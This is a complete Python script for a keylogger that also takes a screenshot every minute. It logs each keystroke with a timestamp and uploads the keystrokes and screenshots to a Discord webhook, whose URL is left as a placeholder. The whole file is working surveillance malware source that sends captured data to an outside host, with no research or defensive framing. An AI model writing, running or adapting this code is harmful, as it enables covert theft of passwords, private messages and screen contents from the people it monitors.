from pynput import keyboard
import requests
import time
import threading
from PIL import ImageGrab
import io

# Get your Discord webhook URL from: https://discord.com/developers/applications
DISCORD_WEBHOOK_URL = "//DISCORD SERVER lINK "


screenshot_running = True
keys_buffer = ""
last_upload = time.time()

def send_to_discord(data):
    try:
        payload = {
            'content': f"```\n{data}\n```"  # Code block format
        }
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        if response.status_code == 204:
            print(f"\n✓ Sent keys to Discord")
        else:
            print(f"\n✗ Error: {response.status_code}")
    except Exception as e:
        print(f"\n✗ Upload error: {e}")

def take_screenshot_and_upload():
    global screenshot_running
    counter = 1
    
    while screenshot_running:
        try:
            # Take screenshot
            screenshot = ImageGrab.grab()
            
            # Convert to bytes
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_bytes.seek(0)
            
            # Send to Discord
            files = {'file': ('screenshot_' + str(counter) + '.png', img_bytes, 'image/png')}
            payload = {'content': f'Screenshot #{counter} - {time.strftime("%Y-%m-%d %H:%M:%S")}'}
            
            response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
            
            if response.status_code == 204:
                print(f"✓ Screenshot #{counter} sent to Discord")
            else:
                print(f"✗ Error: {response.status_code}")
            
            counter += 1
            time.sleep(60)  # Wait 1 minute
            
        except Exception as e:
            print(f"✗ Error: {e}")
            time.sleep(60)

def on_press(key):
    global keys_buffer, last_upload
    
    timestamp = time.strftime("%H:%M:%S")
    
    try:
        char = key.char
    except AttributeError:
        char = str(key).replace("Key.", "")
    
    log_entry = f"{timestamp}: {char}"
    keys_buffer += log_entry + "\n"
    print(log_entry)
    
    # Send every 50 keys or every 30 seconds
    if keys_buffer.count("\n") > 50 or (time.time() - last_upload) > 30:
        send_to_discord(keys_buffer)
        keys_buffer = ""
        last_upload = time.time()

def on_release(key):
    global screenshot_running
    if key == keyboard.Key.esc:
        screenshot_running = False
        if keys_buffer:
            send_to_discord(keys_buffer)
        print("Stopping...")
        return False

# Start screenshot thread
screenshot_thread = threading.Thread(target=take_screenshot_and_upload, daemon=True)
screenshot_thread.start()

# Listen for key presses
print("Logging keys with timestamp format... Press ESC to stop.\n")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Done!")